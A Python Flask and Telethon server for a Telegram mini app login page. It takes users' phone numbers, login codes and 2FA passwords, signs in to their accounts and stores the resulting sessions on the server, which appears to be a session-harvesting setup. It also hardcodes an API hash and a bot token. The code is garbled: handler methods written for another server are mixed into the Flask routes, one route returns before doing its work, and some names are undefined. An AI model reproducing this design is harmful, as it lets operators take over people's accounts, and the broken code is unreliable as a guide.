import asyncio
import json
import psycopg2
import os
from aiogram import Bot
from telethon.sync import TelegramClient
from flask import Flask
from flask import Flask, render_template, request, jsonify

app = Flask(__name__, template_folder="templates")

from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneNumberInvalidError)

DATABASE_URL = os.getenv("DATABASE_URL")

def get_db():
    return psycopg2.connect(DATABASE_URL)

API_ID = 25780325
API_HASH = "2c4cb6eee01a46dc648114813042c453"
BOT_TOKEN = "8485200508:AAEIwbb9HpGBUX_mWPGVplpxNRoXXnlSOrU"
bot = Bot(BOT_TOKEN)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)

# phone -> {client, phone_code_hash}
pending = {}

def run_telethon(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(coro)
    loop.close()
    return result


def session_path(phone):
    return os.path.join(SESSIONS_DIR, phone.replace("+", ""))

    def do_GET(self):
        if self.path in ["/", "/login.html"]:
            with open("login.html", "rb") as f:
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(f.read())
            return
        self.send_error(404)

    def do_POST(self):
        # 1️⃣ JSONni xavfsiz o‘qiymiz
        try:
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length)

            if not raw:
                return self.respond({"status": "empty_body"})

            data = json.loads(raw)
        except Exception as e:
            print("POST PARSE ERROR:", e)
            return self.respond({"status": "bad_request"})

        action = data.get("action")
        phone = data.get("phone")
        code = data.get("code")
        password = data.get("password")

        # ===== SEND CODE =====
@app.route("/send_code", methods=["POST"])
def send_code():
    print("🔥 SEND_CODE KELDI")
    return jsonify({"status": "code_sent"})

    data = request.json
    phone = data.get("phone")

    async def _send():
        client = TelegramClient(session_path(phone), API_ID, API_HASH)
        await client.connect()
        sent = await client.send_code_request(phone)
        pending[phone] = {
            "client": client,
            "hash": sent.phone_code_hash
        }
        return True

    try:
        run_telethon(_send())
        return jsonify({"status": "code_sent"})
    except Exception as e:
        print("SEND CODE ERROR:", e)
        return jsonify({"status": "error", "message": str(e)}), 500



                        # ===== VERIFY CODE =====
@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    if phone not in pending:
        return jsonify({"status": "no_code_requested"})

    async def _verify():
        client = pending[phone]["client"]
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=pending[phone]["hash"]
        )
        me = await client.get_me()
        await client.disconnect()
        pending.pop(phone)
        return me.id

    try:
        user_id = run_telethon(_verify())
        return jsonify({"status": "success", "user_id": user_id})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


        # ===== VERIFY PASSWORD (2FA) =====
        if action == "verify_password":
            if phone not in pending:
                return self.respond({"status": "no_session"})

            client = pending[phone]["client"]

            try:
                client.sign_in(password=password)
            except Exception:
                return self.respond({"status": "invalid_password"})

            # 🔥 ENG MUHIM JOY
            me = client.get_me()
            user_id = me.id

            
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO authorized_users (user_id, phone)
                VALUES (%s, %s)
                ON CONFLICT (user_id) DO UPDATE SET phone = EXCLUDED.phone
            """, (str(user_id), phone))

            conn.commit()
            conn.close()


            client.disconnect()
            pending.pop(phone)

            return self.respond({"status": "success"})


    def respond(self, data):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

def notify_bot_sync(user_id):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    loop.run_until_complete(
        bot.send_message(
            int(user_id),
            "✅ Siz muvaffaqiyatli tizimga kirdingiz!\n\n"
            "👇 Endi botdan to‘liq foydalanishingiz mumkin:",
            reply_markup=main_menu()
        )
    )

    loop.close()

@app.route("/")
def index():
    return "OK, LOGIN SERVER ISHLAYAPTI"

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")

# (keyinchalik auth uchun)
@app.route("/auth", methods=["POST"])
def auth():
    data = request.json
    return jsonify({"ok": True})

# =========================
# RUN
# =========================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)

















